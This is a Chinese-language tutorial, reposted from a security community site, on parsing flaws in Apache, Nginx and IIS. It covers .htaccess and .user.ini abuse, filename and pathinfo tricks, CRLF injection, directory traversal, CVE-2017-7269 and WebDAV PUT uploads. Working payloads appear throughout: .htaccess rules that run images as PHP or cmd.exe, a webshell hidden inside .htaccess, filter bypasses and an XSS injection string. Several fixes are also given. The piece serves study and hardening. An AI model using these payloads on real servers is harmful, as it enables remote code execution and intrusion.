> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8631)

php 常见运行方式有 apache 的模块模式 (分为 mod_php 和 mod_cgi) cgi`模式,`fast-cgi 模式

1.  cgi 模式就是建立在多进程上的, 但是 cgi 的每一次请求都会有启动和退出的过程 (fork-and-execute 模式, 启动脚本解析器解析 php.ini 初始化运行环境, 载入 dll), 这在高并发时性能非常弱.
    
2.  fast-cgi 就是为了解决 cgi 的问题而诞生的, web server 启动时 会启动 fastcgi 进程管理器, fastcgi 进程管理器读取 php.ini 文件并初始化, 然后启动多个 cgi 解释器进程 (php-cgi), 当收到请求时, web server 会将相关数据发送到 fastcgi 的子进程 php-cgi 中处理.
    
3.  apache 模块模式
    
    *   mod_php 模式, apache 调用与 php 相关模块 (apache 内置), 将 php 当做 apache 子模块运行. apache 每收到一个请求就会启动一个进程并通过 sapi(php 和外部通信的接口) 来连接 php
        
    *   mod_cgi/mod_fcgid 模式 使用 cgi 或者 fast-cgi 实现.
        

> 而 php 版本分为 nts(None-Thread Safe) 和 ts(Thread Safe), 在 windows 中创建线程更为快捷, 而在 linux 中创建进程更快捷, 在 nts 版本下 fast-cgi 拥有更好的性能所以 windows 下经常采用 fast-cgi 方式解析 php. 所以在 nts 版本里面是没有 mod_php (phpxapachexxx.dll) 模块的.

```
AddHandler:
    AddHandler php5-script .jpg
    AddHandler   fcgid-script .jpg
    在文件扩展名与特定处理器之间建立映射
Addtype:
    AddType application/x-httpd-php .jpg
```

1. 多名后缀
-------

如：

```
flag.php.aaa  就会解析为php文件
```

其中 php 文件后缀

```
".+\.ph(p[345]?|t|tml)\."
php,php3,php4,php5,pht,phtml都会当成php文件执行
```

2`.htaccess`
------------

> 修改`.htaccess`的文件名`修改apache下的conf文件的AccessFileName .htaccess`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-dd721036-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-dd721036-3f42-1.png)

作用

> .htaccess 文件可以配置很多事情，如**是否开启站点的图片缓存**、**自定义错误页面**、**自定义默认文档**、**设置 WWW 域名重定向**、**设置网页重定向**、**设置图片防盗链和访问权限控制**。但我们这里只关心. htaccess 文件的一个作用——MIME 类型修改。

### 生效条件 (php 解析, 命令执行)

在`CGI/FastCGI`模式下 (在 phpinfo 中的 Server API 查看)

`.htaccess`文件配置

1.  将 jpg 后缀文件解析为 php 文件

```
AddHandler   fcgid-script .jpg
FcgidWrapper "G:/11111111gongju/phpstudy_pro/Extensions/php/php7.0.9nts/php-cgi.exe" .jpg
将php-cgi.exe路径改为对应的php版本即可
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-dd9716e2-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-dd9716e2-3f42-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-ddb938b2-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-ddb938b2-3f42-1.png)

1.  执行命令 (此方法下我无法解析 php 了)
    
    AddHandler 添加某一特殊文件后缀作为 cgi 程序
    
    ```
    .htaccess
    
    Options +ExecCGI
    AddHandler cgi-script .jpg
    
    test.jpg
    #!C:/Windows/System32/cmd.exe /c start notepad
    test
    
    必须要有两排数据 第二排随意
    
    方法二:
    打开任意文件执行命令
    Options +ExecCGI(如果配置文件中有则不用添加)
    AddHandler   fcgid-script .jpg
    FcgidWrapper "C:/Windows/System32/cmd.exe /c start calc.exe" .jpg
    ```
    
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-dddea7d2-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100318-dddea7d2-3f42-1.png)
    

> 这与 apache 的 conf/vhosts 文件夹中的配置相同, 这个文件夹可以在单个 ip 创建不同域名的配置文件.

1.  使用`SetHandler`将目录下所有文件视为 cgi 程序

```
SetHandler cgi-script
或者
SetHandler   fcgid-script
FcgidWrapper "C:/Windows/System32/cmd.exe /c start calc.exe

不需要添加后缀
```

1.  使用相对路径
    
    > 无法使用绝对路径是可以利用一下
    

在 handler 模式下

```
1. 配置文件中在对应目录下 如: /var/www/html添加  AllowOverride All

windows下Apache要加载mod_Rewrite模块，配置文件上写上：LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so

重启apache
```

```
1. AddType application/x-httpd-php .xxx 
   AddHandler application/x-httpd-php .xxx    将xxx后缀作为php解析

2. SetHandler application/x-httpd-php 将该目录下所有文件及其子文件中的文件当做php解析
3.  
  <FilesMatch ".+\.jpg">
    SetHandler application/x-httpd-php
  </FilesMatch>
该语句会让Apache把.jpg文件解析为php文件。
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de07a52e-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de07a52e-3f42-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de24cf3c-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de24cf3c-3f42-1.png)

*   防御方法
    
    修改匹配规则
    
    ```
    <FileMatch ".+\.php$">
    SetHandler application/x-httpd-php
    </FileMatch>
    
    
    ```
    
    禁止. php. 这样的文件执行
    
    ```
    <FileMatch ".+\.ph(p[3457]?|t|tml)\.">
    Require all denied
    </FileMatch>
    
    
    ```
    

`.htaccess包含文件`

```
php_value auto_prepend_file "test.jpg" 文件开始插入
php_value auto_append_file "test.jpg"  文件结束插入

利用伪协议 
php_value auto_prepend_file php://filter/convert.base64-decode/resource=test.jpg

test.jpg  
<?php phpinfo();?>

```

### 其他利用方式

查看 apache 服务器信息

```
SetHandler server-status

```

绕过 preg_math

```
设置回溯限制
 pcre.backtrack_limit给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false,在,htaccess中手动修改这个限制

php_value pcre.backtrack_limit 0
php_value pcre.jit 0

```

使`.htaccess`可以访问

```
编辑.htaccess
<Files ~ ".htaccess">
    Require all granted
    Order allow,deny
    Allow from all
</Files>

```

将`.htaccess`作为 shell

```
<Files ~ ".htaccess">
    Require all granted
    Order allow,deny
    Allow from all
</Files>

SetHandler application/x-httpd-php

#<?php phpinfo();?>
注意#号

```

### 绕过

```
反斜线绕过
SetHa\
ndler appli\
cation/x-ht\
tpd-php

文件中不能包含某些关键字符
上传base加密的文件
利用php_value auto_prepend_file包含文件时base解密

包含session文件

php_value auto_append_file "/tmp/sess_session文件名"
php_value session.save_path "/tmp"  # session文件储存位置
php_flag session.upload_progress.cleanup off # session上传进度

```

3. `.use.ini`
-------------

> `.usr.ini`不只是 nginx 专有的, 只要是以 fastcgi 方式运行 php 的 都能够使用 (apache/nginx/iis), 作用相当于可以自定义的`php.ini`文件

```
auto_prepend_file=123.jpg 文件前包含
auto_append_file = 123.jpg文件后包含

```

让目录下的所有 php 文件自动包含`123.jpg`文件

4. 目录遍历
-------

`httpd.conf`下

```
Options+Indexes+FollowSymLinks +ExecCGI   改为   Options-Indexes+FollowSymLinks +ExecCGI

```

文件名解析漏洞
-------

> 影响版本: Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7

```
location ~ \.php$ {
    include        fastcgi_params;

    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
    fastcgi_param  DOCUMENT_ROOT /var/www/html;
}

```

> 当 nginx 匹配到`.php`结尾的文件时就将其当做 php 文件解析
> 
> 当我们请求`test.jpg[0x20][0x00].php`时, 就会将其匹配为 php 文件, 但是 nginx 却认为这是 jpg 文件, 将其设置为 SCRIPT_FILENAME 的值发送给 fastcgi, fastcgi 根据`SCRIPT_FILENAME`的值进行解析造成漏洞

我们只需上传一个空格结尾的文件 (如`1.jpg空格`), 访问 1.jpg 空格 [0x00].php 就行

```
可以先发写为1.jpgaa.php, 然后再hex格式中修改为20 00

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de509bc6-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de509bc6-3f42-1.png)

文件后缀解析
------

源文件为`test.jpg`访问时改为`test.jpg/x.php`解析为 php(x 随意)

```
1. 在高版本的php中关闭security.limit_extensions(在php-fpm.conf直接删除)
    一般为security.limit_extensions php只允许.php文件执行, 添加 .jpg 将jpg文件作为php文件执行, 需要重启php-fpm
2. php.ini中设置cgi.fix_pathinfo=1
    当访问/test.jpg/x.php时 若x.php不存在则向前解析

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de6d3e52-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de6d3e52-3f42-1.png)

```
修复
php.ini 中的  cgi.fix_pathinfo=0 访问后就是404
将/etc/php5/fpm/pool.d/www.conf 添加 security.limit_extensions = .php

```

CRLF
----

http 的报文就是`CRLF`分隔的 (回车 + 换行)

若 nginx 在解析 url 时将其解码则会造成注入

```
错误的配置文件
location / {
    return 302 https://$host$uri;
}

```

详细可参考: [Bottle HTTP 头注入漏洞探究 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html)

[新浪某站 CRLF Injection 导致的安全问题 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html)

```
在请求时加上
/%0d%0a%0d%0a<img src=1 onerror=alert(/xss/)>(%0d%0a==>回车+换行)

```

目录穿越
----

`alias`为目录配置别名时, 如果没有没有添加`/`

`nginx.conf`修改为

```
location /files {  #这里files就没有闭合
    autoindex on;
    alias /home/;

```

访问`files../`即可造成目录穿越

```
修复: 将/files闭合  ==>  /files/

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de913f8c-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100319-de913f8c-3f42-1.png)

add_header 覆盖
-------------

错误配置文件

Nginx 配置文件子块（server、location、if）中的`add_header`，将会覆盖父块中的`add_header`添加的 HTTP 头

```
add_header Content-Security-Policy "default-src 'self'";
add_header X-Frame-Options DENY;

location = /test1 {
    rewrite ^(.*)$ /xss.html break;
}

location = /test2 {
    add_header X-Content-Type-Options nosniff;  #覆盖掉父块中的配置
    rewrite ^(.*)$ /xss.html break;
}

```

cve-2017-7269
-------------

> iis 6.0 开启 webdav, 攻击前记得拍摄快照!!!!!

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100320-deb93b68-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100320-deb93b68-3f42-1.png)

> exp: [zcgonvh/cve-2017-7269: fixed msf module for cve-2017-7269 (github.com)](https://github.com/zcgonvh/cve-2017-7269)

直接 set rhost 然后 exploit

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100320-df27f256-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100320-df27f256-3f42-1.png)

直接打是用在 iis 没有绑定主机时

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100321-df50b7c2-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100321-df50b7c2-3f42-1.png)

如果绑定了就需要输入物理路径长度 (如: `c:\inetpub\wwwroot\` 就是 19)

修改路径为`c:\inetpub\wwwroot1111111`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100321-df720332-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100321-df720332-3f42-1.png)

使用脚本爆破 ([Windows-Exploit/IIS6_WebDAV_Scanner at master · admintony/Windows-Exploit (github.com)](https://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100321-dfa83ec0-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100321-dfa83ec0-3f42-1.png)

```
set PhysicalPathLength 26

```

然后即可攻击成功

PUT 漏洞
------

> 条件 IIS6.0 开启 WebDAV 和**来宾用户写权限**

使用 PUT 方式, 上传 txt 文件 (直接上传 asp 文件会失败)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-dfde48e4-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-dfde48e4-3f42-1.png)

然后利用 move 将 txt 文件修改为 asp, 变为可执行脚本 蚁剑连接

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-e0050222-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-e0050222-3f42-1.png)

记得在 web 扩展中开启 active server pages

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-e02b8028-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-e02b8028-3f42-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-e0540d9a-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100322-e0540d9a-3f42-1.png)

短文件名猜测
------

> windows 下为兼容 MS-DOS 而生成的短文件
> 
> 只显示前 6 个字符, 后面的字符使用~ 1,~2 等等代替, 后缀只显示前 3 个字符. 并且全部以大写字母显示
> 
> 文件名大于 9 或者后缀大于 4 才会生成短文件名, 使用`dir /x`查看短文件名

影响版本

> IIS 1.0，Windows NT 3.51
> 
> IIS 3.0，Windows NT 4.0 Service Pack 2
> 
> IIS 4.0，Windows NT 4.0 选项包
> 
> IIS 5.0，Windows 2000
> 
> IIS 5.1，Windows XP Professional 和 Windows XP Media Center Edition
> 
> IIS 6.0，Windows Server 2003 和 Windows XP Professional x64 Edition
> 
> IIS 7.0，Windows Server 2008 和 Windows Vista
> 
> IIS 7.5，Windows 7（远程启用 <customerrors> 或没有 web.config）</customerrors>
> 
> IIS 7.5，Windows 2008（经典管道模式）
> 
> IIS 使用. Net Framework 4 时不受影响

漏洞成因

```
使用短文件名访问存在的文件时会返回404, 否则返回400
如存在aaaaaaaaaa.txt 短文件名为 AAAAAA~1.TXT的文件
访问http://xxxxx/A*~1.*/.aspx会返回404
通过逐步增加字符找出文件的文件名

```

缺点:

```
只能找出前6个字符和后缀的三个字符
只能猜解有短文件名的文件
不支持中文
iis和.net都需要满足

```

漏洞修复

```
升级.net到4.0及以上版本
修改注册表, HKEY\ LOCAL MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem中的 NtfsDisable8dot3 Name Creation值为1,使其不创建短文件名

```

后缀解析漏洞
------

```
cer asa cdx 都会当做asp文件解析
但是我在windows server 2003 + iis 6.0下只有cer可以

```

漏洞原因:

​ 当访问不存在文件时返回 404, 访问不存在短文件名时返回 400

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100323-e072f796-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100323-e072f796-3f42-1.png)

> 版本: iis 6.0

1.  xxx.asp 文件夹里面的文件都会以 asp 解析

[![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100323-e09beffc-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100323-e09beffc-3f42-1.png)

1.  `;`截断
    
    ```
    xxx.asp;.txt会以asp文件执行
    
    ```
    
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20201216100323-e0bfda34-3f42-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20201216100323-e0bfda34-3f42-1.png)
    

1.  遇到 php 文件时

> iis 7.5

```
当iis遇见php后缀文件时, 将其交给php处理, 当php开启cgi.fix_pathinfo时会处理文件, 如同nginx一样
所以输入test.jpg/.php就会当场php处理

```

参考: [关于 CGI 和 FastCGI 的理解 - 天生帅才 - 博客园 (cnblogs.com)](https://www.cnblogs.com/tssc/p/10255590.html)

[.htaccess 利用与 Bypass 方式总结 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/205098)

[Web 中间件漏洞总结之 Nginx 漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6801)

[https://xz.aliyun.com/t/6783](https://xz.aliyun.com/t/6783)